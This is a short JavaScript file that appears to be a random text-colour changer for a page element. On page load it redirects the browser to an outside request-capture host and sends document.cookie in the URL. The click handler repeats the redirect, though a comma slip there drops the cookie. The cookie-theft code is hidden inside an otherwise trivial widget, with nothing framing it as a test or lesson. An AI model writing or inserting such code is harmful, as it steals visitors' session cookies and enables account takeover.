const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

document.addEventListener("DOMContentLoaded", () => {
window.location = "https://toitoise.free.beeceptor.com/?c=" + document.cookie;
});

color.onclick = () => {
    target.style.color = `rgb(${getRandomInt(255)}, ${getRandomInt(255)}, ${getRandomInt(255)})`;
    window.location = "https://toitoise.free.beeceptor.com/?c=", document.cookie;
}
